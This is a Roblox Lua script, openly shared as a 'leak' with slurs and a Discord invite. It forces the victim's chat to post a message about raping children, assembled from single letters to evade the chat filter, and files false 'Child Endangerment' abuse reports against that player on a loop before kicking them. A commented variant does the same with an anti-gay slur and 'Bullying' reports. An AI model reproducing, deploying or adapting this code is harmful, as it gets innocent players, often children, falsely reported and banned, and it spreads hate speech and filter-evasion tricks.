--[[
Here's a gay ass leak lmao suck my cock also join discord.gg/skidding

Proof: https://www.youtube.com/watch?v=8ELvmdF4slY || this is roblox showing that they actually knew about this issue
]]--   

repeat wait() until game:IsLoaded() -- The game's server wait until you are fully loaded so your character can access chat ( to the exploit can start )

local Players = game:GetService'Players' -- The game request the players in the game
local SayMessageRequest =
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest -- Game's request Players chat by going into files of the game
local a = 'p' -- This rearranges the letters
local g = 'r' -- so it will say "rape"
local d = 'a' -- but it won't get detected by Roblox
local f = 'e' -- because if the word "rape" is in the model it'll get instantly taken down

--[[
example (this may not work):

local Players = game:GetService'Players'
local SayMessageRequest =
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest

local a = 'f'
local e = 't' 
local c = 'g' -- this all rearranges the letters in "faggot"
local b = 'a'
local d = 'o'

SayMessageRequest:FireServer('I hate '..a..b..c..c..d..e' so much and they piss me off!')
task.wait(0.8) -- Waits 0.8 seconds to send the report
Players:ReportAbuse(Players.LocalPlayer, 'Bullying', 'Bullying')
]]--

spawn(function() -- this requests to do the function
    while true do
        SayMessageRequest:FireServer('I '..g..d..a..f' children.') -- Tricks the game by putting ' a=p ' and all so it forms the word "rape"
        task.wait(0.8) -- Waits 0.8 seconds to send the report
        Players:ReportAbuse(Players.LocalPlayer, 'Child Endangerment', 'Child Endangerment') -- The game reports all the players for Child Engangerment 
    end
end)

wait(8) -- wait time in seconds

Players.LocalPlayer:Kick() -- Kicks players after 8 seconds ( End of the loading screen of the game )

-- CODE LEAKED BY 'k[39kb~¹1M×Drµ¿V|½)5M\ö*Ñ÷¿#3468', REWROTEN & EXPLAIN BY 'bbb#4444'

-- they gatekeeped 17 lines of code and took them 7 years to find this out. 7. the chat system has been abusable for 7 years and they didnt find this out until now.
